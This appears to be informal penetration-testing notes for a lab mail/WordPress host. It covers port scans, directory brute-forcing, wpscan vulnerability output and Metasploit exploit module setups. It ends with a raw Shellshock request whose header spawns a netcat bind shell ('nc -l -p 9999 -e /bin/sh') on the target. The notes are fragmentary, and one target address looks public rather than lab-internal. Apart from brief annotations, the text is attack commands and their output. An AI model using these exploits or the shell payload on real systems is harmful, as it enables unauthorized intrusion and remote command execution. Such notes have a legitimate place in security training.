# How to do it

Scan all ports
```
sudo nmap -p- -sS 192.168.101.12
sudo nmap -p- -sS 192.168.101.13
nmap 192.168.101.12-13 -n -sV
```

Opened ports for `192.168.101.12`
```
25/tcp   open  smtp    Postfix smtpd
80/tcp   open  http    nginx 1.14.2
143/tcp  open  imap    Dovecot imapd
8080/tcp open  http    nginx

25/tcp   open  smtp          # 220-mail.test.lab ESMTP Postfix
80/tcp   open  http          #
143/tcp  open  imap          # ask for username and password
8080/tcp open  http-proxy    # email with username and password
Service Info: Host: -mail.test.lab
```

Opened ports for `192.168.101.13`
```
nmap -v -n -sV -Pn 192.168.101.13

[*] Nmap: 80/tcp   filtered http
[*] Nmap: 143/tcp  filtered imap
[*] Nmap: 8080/tcp filtered http-prox
```

Opened ports for `92.242.132.24`
```
sudo nmap -F 92.242.132.24

80/tcp   open   http
8080/tcp closed http-proxy
8888/tcp closed sun-answerbook
```

Investigating `site.test.lab`

```
site: http://site.test.lab
ip: 92.242.132.24
```

Investigating
```
http://192.168.101.12:8080/mail/
Ask for password
```

## Port 80

`/etc/hosts`
```
127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost
192.168.101.12 site.test.lab
```

Run command: `sudo killall -HUP mDNSResponder` to refresh DNS

![Access Web](img/access_to_webpage.png)

commands
```
nikto -h site.test.lab
```
The anti-clickjacking X-Frame-Options header is not present (https://javascript.info/clickjacking)
The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
(Mime Type attack)
```
 gobuster -u http://site.test.lab -w files/commons.txt -fw -s 200,204,301,302 -a Mozilla/5.0
 gobuster -u http://site.test.lab -w files/commons.txt -s 200,204,301,302 -U admin -P admin
 gobuster -m dns -u http://site.test.lab -w files/commons.txt
 gobuster -u http://92.242.132.24/ -w files/commons.txt -s 200,204,301,302 â€“p 92.242.132.24:8080
```

Found following

```
http://site.test.lab/wordpress (Status: 301)
http://site.test.lab/wp-content (Status: 301)
http://site.test.lab/wp-includes (Status: 301)
http://site.test.lab/version
```

curl http://92.242.132.24/wordpress --proxy-header "http://92.242.132.24:8080" -v

Looks like there is a wordpress site behind it

Add wpscan and run stuff
```
git submodule add https://github.com/wpscanteam/wpscan.git
```

Identify Wordpress Version
```
docker run -it --rm wpscanteam/wpscan --url http://site.test.lab/ --random-user-agent
Wordpress version: > 4.9.8
Found file: http://site.test.lab/readme.html
```

Run all vulnerabiltiies scan and vulnerable plugins only
```
docker run -it --rm wpscanteam/wpscan --url http://site.test.lab/ -e at -e ap -e u --random-user-agent
make wpscan_vplugin

7 vulnerabilities identified:
Title: WordPress <= 5.0 - Authenticated File Delete
Title: WordPress <= 5.0 - Authenticated Post Type Bypass
Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
```

Run metasploit
```
docker run -it --rm metasploitframework/metasploit-framework
use exploit/unix/webapp/wp_reflexgallery_file_upload
set rhost site.test.lab
```


## Run imap exploit

```
use exploit/linux/smtp/exim4_dovecot_exec
set RHOSTS 192.168.101.12/32
show targets
set TARGETS 0
set RPORT 143
exploit
```

## Check mailer
```
gobuster -u http://site.test.lab:8080/mail -w files/commons.txt -fw -s 200,204,301,302 -a Mozilla/5.0 -r
2019/01/06 02:14:39 [!] Get http://site.test.lab:8080/mail/games: dial tcp 192.168.101.12:8080: connect: connection refused
2019/01/06 02:14:41 [!] Get http://site.test.lab:8080/mail/newsletter: dial tcp 192.168.101.12:8080: connect: connection refused
2019/01/06 02:14:44 [!] Get http://site.test.lab:8080/mail/workplace: dial tcp 192.168.101.12:8080: connect: connection refused
```

show options
set RHOSTS 92.242.132.24/32
set rhost site.test.lab
set proxy 92.242.132.24:8080

curl http://192.168.101.12/wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save&survey_id=3556498 -v






echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: 192.168.101.12/\r\nConnection: close\r\n\r\n" | nc 192.168.101.12 80

1..255 | % {echo "192.168.101.$_"; ping -n 1 -w 100 192.168.101.$_} | Select-String ttl
